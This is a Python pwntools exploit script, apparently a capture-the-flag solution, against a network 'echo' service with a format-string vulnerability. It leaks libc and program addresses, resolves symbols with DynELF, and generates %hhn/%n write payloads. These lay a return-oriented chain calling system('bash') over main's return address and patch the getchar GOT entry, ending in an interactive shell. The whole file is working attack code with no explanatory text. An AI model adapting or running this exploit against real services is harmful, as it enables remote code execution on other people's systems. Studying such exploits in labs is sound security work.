#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'error'


class StrFmt:

    def __init__(self, strfmt_position, arch=8, already_printed=0, pad_char='\x00', granularity=1, nbytes=None):
        self.strfmt_position = strfmt_position
        self.arch = arch
        self.already_printed = already_printed
        self.pad_char = pad_char
        self.granularity = granularity
        self.nbytes = nbytes or arch
        self.pX = lambda v: (struct.pack('<I', v) if self.arch == 4 else struct.pack('<Q', v))

    def write(self, addr, value, granularity=None, nbytes=None, pad_char=None):
        granularity = granularity or self.granularity
        nbytes = nbytes or self.nbytes
        pad_char = pad_char or self.pad_char

        currently_written = self.already_printed
        len_modifier = {1: 'hhn', 2: 'hn', self.arch: 'n'}[granularity]

        list = []
        for i in range(nbytes / granularity):
            caddr = addr + i * granularity
            cval = (value >> 8 * i * granularity) % 256 ** granularity
            n = cval - currently_written
            while n < 0:
                n += 256 ** granularity
            adjustfmt = ('%0{}c'.format(n) if n > 0 else '')

            expected_max_len = -len(adjustfmt) % self.arch - self.arch
            current_len = expected_max_len + 1
            while expected_max_len < current_len:
                expected_max_len += self.arch
                writefmt = '%{}${}'.format(self.strfmt_position
                        + (expected_max_len + len(adjustfmt))
                        / self.arch, len_modifier)
                current_len = len(writefmt)

            padding = pad_char * (-(len(writefmt) + len(adjustfmt)) % self.arch)
            list.append(adjustfmt + writefmt + padding + self.pX(caddr))
        return list


def get(addr):
    p.send_raw('%9$s_|_\x00' + p64(addr) + '\n')
    data = p.readuntil('_|_', drop=True)
    p.recv(timeout=1)
    if len(data) == 0:
        data = '\x00'
    return data


def next_step(base=None, step=None):
    next_step.current = base or next_step.current
    next_step.step = step or next_step.step
    current = next_step.current
    next_step.current += next_step.step
    return current


# p = process(['./echo', 'flag'], aslr=True)
p = remote('localhost', 4444)
p.recv()

prog = log.progress('Extracting libc_start_main', level=555)
p.sendline('%15$p')
libc_start_main = int(p.readuntil('\necho >', drop=True), 16)  # -231
p.recv(timeout=1)
prog.success('{:#x} : Done'.format(libc_start_main))

prog = log.progress('Extracting text base', level=555)
p.sendline('%39$p')
pbase = int(p.readuntil('\necho >', drop=True), 16) - 0x79a
p.recv(timeout=1)
prog.success('{:#x} : Done'.format(pbase))

d = DynELF(get, libc_start_main)
environ = d.lookup('environ')
envptr = u64(get(environ).ljust(8, '\x00'))
firstenvptr = u64(get(envptr).ljust(8, '\x00'))

mainretptr = envptr - 248
target_arg = firstenvptr
pr_1rdi = pbase + 0xa03

write_dict = {
    next_step(mainretptr, 8): pr_1rdi,
    next_step(): {'value': 1, 'granularity': 8},
    next_step(): d.lookup('sleep'),
    next_step(): pr_1rdi,
    next_step(): target_arg,
    next_step(): d.lookup('system'),
    next_step(): pr_1rdi,
    next_step(): {'value': 0, 'granularity': 8},
    next_step(): d.lookup('exit'),
}

write_str = 'bash\x00'
log.log(message='String to be added onto stack: {}'.format(write_str), level=555)
for i in range(0, len(write_str), 8):
    write_dict[target_arg + i] = int(write_str[i:i + 8][::-1].encode('hex'), 16)

log.log(message='Breaking out of the loop', level=555)
write_dict[pbase + ELF('./echo').got['getchar']] = pbase + 0x995

prog = log.progress('Performing the memory writes', level=555)
strfmt2 = StrFmt(8)
for (addr, vd) in write_dict.iteritems():
    if not isinstance(vd, dict): vd = {'value': vd}
    fmt_list = strfmt2.write(addr, **vd)
    for i in range(len(fmt_list)):
        cfmt = fmt_list[i]
        p.sendline(cfmt)
        p.recv()
prog.success()

p.sendline('A' * 31 + "ps aux|grep socat| awk '{print $NF}'")
log.log(message='Enjoy', level=555)

p.interactive()
